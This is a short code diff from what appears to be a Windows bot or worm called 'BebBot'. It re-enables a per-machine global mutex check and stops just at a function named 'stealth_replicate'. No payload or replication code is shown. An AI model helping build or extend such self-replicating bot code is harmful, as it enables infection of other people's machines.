@@ -397,14 +397,14 @@ def get_unique_id():
     name = f"{os.environ.get('COMPUTERNAME', 'UNKNOWN')}-{getpass.getuser()}"
     return int(hashlib.md5(name.encode()).hexdigest(), 16) % 10000
 
-# def ensure_single_instance():
-#     mutex_name = f"Global\\BebBot_{get_unique_id()}"
-#     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
-#     if ctypes.windll.kernel32.GetLastError() == 183:
-#         sys.exit(0)
-#     return mutex
+def ensure_single_instance():
+    mutex_name = f"Global\\BebBot_{get_unique_id()}"
+    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
+    if ctypes.windll.kernel32.GetLastError() == 183:
+        sys.exit(0)
+    return mutex
 
-# _instance_mutex = ensure_single_instance()
+_instance_mutex = ensure_single_instance()
 print("[DEBUG] Single instance check bypassed.")
 
 def stealth_replicate():
